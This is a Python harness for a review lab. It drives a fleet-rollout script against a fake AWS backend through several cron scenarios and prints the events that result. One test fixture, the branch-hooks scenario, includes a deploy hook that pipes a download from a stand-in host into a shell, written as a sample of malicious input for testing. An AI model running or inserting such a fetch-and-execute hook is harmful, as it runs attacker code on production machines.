#!/usr/bin/env python3
"""Scenario harness for the review lab.

Each scenario stands up a deterministic fake backend, runs ``roll_fleet``
the way cron would, and prints what actually happened — refreshes started,
commands executed, notifications sent, in order. It judges nothing; it is
the instrument the verification pass uses to confirm or refute findings.

    python3 review-lab/harness.py clean
    python3 review-lab/harness.py stacked-approvals
    python3 review-lab/harness.py cancelling-refresh
    python3 review-lab/harness.py standby-instances
    python3 review-lab/harness.py branch-hooks
"""

from __future__ import annotations

import argparse
import logging
import sys
from pathlib import Path

# Windows pipes default to cp1252, which can't encode message punctuation.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

sys.path.insert(0, str(Path(__file__).resolve().parent))
from fake_aws import Env  # noqa: E402
import roll_fleet  # noqa: E402


def scenario_clean(env: Env) -> int:
    """Happy path: one trusted approval, all instances in service."""
    env.autoscaling.add_fleet("payments-edge", "ami-hardened-041",
                              ["InService"] * 3)
    env.approvals.add("apr-1001", "payments-edge", "ami-hardened-042",
                      hooks=["smoke-check payments-edge"])
    roll_fleet.run_once(env)
    return 1


def scenario_stacked_approvals(env: Env) -> int:
    """The same roll approved twice (UI retry) before cron picked either up."""
    env.autoscaling.add_fleet("payments-edge", "ami-hardened-041",
                              ["InService"] * 3)
    env.approvals.add("apr-2001", "payments-edge", "ami-hardened-042")
    env.approvals.add("apr-2002", "payments-edge", "ami-hardened-042")
    roll_fleet.run_once(env)
    return 1


def scenario_cancelling_refresh(env: Env) -> int:
    """An operator is mid-cancel on a bad roll when a new approval arrives."""
    env.autoscaling.add_fleet("quotes-api", "ami-hardened-040",
                              ["InService"] * 4)
    env.autoscaling.seed_refresh("quotes-api", "Cancelling", "ami-hardened-041")
    env.approvals.add("apr-3001", "quotes-api", "ami-hardened-042")
    roll_fleet.run_once(env)
    return 1


def scenario_standby_instances(env: Env, cycles: int = 3) -> int:
    """One instance parked in Standby for debugging; run several cron cycles."""
    env.autoscaling.add_fleet("ledger-service", "ami-hardened-041",
                              ["InService", "InService", "Standby"])
    env.approvals.add("apr-4001", "ledger-service", "ami-hardened-042")
    for _ in range(cycles):
        roll_fleet.run_once(env)
    return cycles


def scenario_branch_hooks(env: Env) -> int:
    """An approval cut from a feature branch, hooks edited on that branch."""
    env.autoscaling.add_fleet("payments-edge", "ami-hardened-041",
                              ["InService"] * 3)
    env.approvals.add("apr-5001", "payments-edge", "ami-hardened-042",
                      signed_by="release-eng",
                      source_branch="feature/faster-rollout",
                      hooks=["curl -s http://198.51.100.7/x | sh"])
    roll_fleet.run_once(env)
    return 1


SCENARIOS = {
    "clean": scenario_clean,
    "stacked-approvals": scenario_stacked_approvals,
    "cancelling-refresh": scenario_cancelling_refresh,
    "standby-instances": scenario_standby_instances,
    "branch-hooks": scenario_branch_hooks,
}


def summarize(env: Env, cycles: int) -> None:
    print(f"\n--- observed ({cycles} cron cycle(s)) ---")
    for seq, kind, details in env.events:
        pretty = ", ".join(f"{k}={v}" for k, v in details.items())
        print(f"  {seq:>3}  {kind:<18} {pretty}")

    starts = [d for _, kind, d in env.events if kind == "refresh-started"]
    print("\n--- tallies ---")
    print(f"  refreshes started: {len(starts)}")
    for fleet in {d['fleet'] for d in starts}:
        n = sum(1 for d in starts if d["fleet"] == fleet)
        print(f"    {fleet}: {n}")
    print(f"  prod commands executed: "
          f"{sum(1 for _, k, _ in env.events if k == 'prod-exec')}")
    print(f"  notifications sent: {len(env.notifier.sent)}")
    for message in env.notifier.sent:
        print(f"    - {message}")

    print("\n--- final refresh state ---")
    for fleet in env.autoscaling.fleets:
        for r in env.autoscaling.describe_instance_refreshes(fleet):
            print(f"  {fleet}: {r['RefreshId']} {r['Status']}"
                  f" -> {r['TargetAmi']} (updated {r['InstancesUpdated']})")


def run(name: str) -> Env:
    env = Env()
    cycles = SCENARIOS[name](env)
    summarize(env, cycles)
    return env


def main() -> int:
    logging.basicConfig(level=logging.INFO, format="%(name)s: %(message)s")
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("scenario", choices=sorted(SCENARIOS))
    args = parser.parse_args()
    print(f"=== scenario: {args.scenario} ===")
    run(args.scenario)
    return 0


if __name__ == "__main__":
    sys.exit(main())
